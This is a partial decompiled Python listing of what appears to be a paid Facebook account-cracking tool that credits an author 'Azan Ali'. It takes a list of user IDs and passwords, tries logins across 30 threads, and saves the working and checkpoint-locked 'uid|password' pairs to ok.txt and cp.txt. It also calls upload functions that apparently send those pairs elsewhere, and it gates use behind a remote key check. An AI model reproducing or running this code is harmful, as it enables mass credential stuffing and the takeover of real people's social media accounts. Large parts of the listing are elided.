# Decompile by Mardis (Tools By Azan-Ali)
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://www.facebook.com/AZAN X.143"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/Azan X.143")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN FACEBOOK >> AZAN ALI")
	subprocess.check_output(["am", "start", "https://www.facebook.com/Azan X.143"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/Azan79/apporved/main/New%20paid%F0%9F%99%83').text
			if basesplit in plr:
				key = basesplit
...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     ...
     \033[1;91m➣ \033[1;92mFACEBOOK   :            AZAN ALI
     \033[1;93m➣ \033[1;92mWHATSAPP   :            923165456679
     \033[1;96m➣ \033[1;92mGITHUB     :            Azan79
...
#				exit()
	...
	def old4_7(self):
		...
		try:
			...
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR DXA  "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[>_] [DXA] : \033[0;97m %s/%s -> \033[0;92m [MAHADI -OK:%s ]- \033[0;93m[MAHADI-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[DXA-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [DXA-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[DXA-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [DXA-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
